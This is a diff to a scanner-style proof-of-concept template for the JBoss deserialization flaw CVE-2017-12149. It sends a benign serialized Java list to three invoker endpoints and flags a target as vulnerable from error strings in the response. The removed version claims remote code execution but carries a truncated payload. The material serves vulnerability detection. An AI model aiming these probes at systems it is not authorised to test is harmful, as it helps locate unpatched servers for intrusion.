@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "该PoC针对JBoss Application Server的HTTP Invoker反序列化漏洞进行验证，通过发送特制的序列化数据触发对ReadOnlyAccessFilter类的反序列化漏洞，实现远程代码执行。该漏洞影响Red Hat Enterprise Application Platform 5.2及JBoss 5.x/6.x版本，攻击者无需认证即可利用。"
+description = "检测目标 JBoss 服务器是否存在 CVE-2017-12149 反序列化漏洞。通过向 /invoker/JMXInvokerServlet、/invoker/EJBInvokerServlet 和 /invoker/readonly 三个端点发送特制的 Java 序列化数据，若响应中包含 JBoss 和 ClassCastException 特征字符串，则判定存在漏洞。"
 id = "POC-AVE-2017-0308"
-name = "CVE-2017-12149 JBoss反序列化RCE漏洞PoC"
+name = "JBoss Application Server 反序列化远程代码执行漏洞 PoC"
 severity = "critical"
 tags = ["ave-2017-0308"]
 vuln_id = [
@@ -11,30 +11,67 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/invoker/EJBInvokerServlet"
+path = "/{{BaseURL}}/invoker/JMXInvokerServlet/"
 protocol = "http"
 
 [poc.requests.body]
-content = "rO0ABXNhYrMjw=="
+content = '{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}'
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/x-java-serialized-object"
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-status = [200]
-type = "status"
-words = ["vulnerable"]
+Content-Type = "application/octet-stream"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["JBoss"]
+words = [
+    "JBoss",
+    "ClassCastException",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/invoker/EJBInvokerServlet/"
+protocol = "http"
+
+[poc.requests.body]
+content = '{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/octet-stream"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "JBoss",
+    "ClassCastException",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/invoker/readonly"
+protocol = "http"
+
+[poc.requests.body]
+content = '{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/octet-stream"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "JBoss",
+    "ClassCastException",
+]
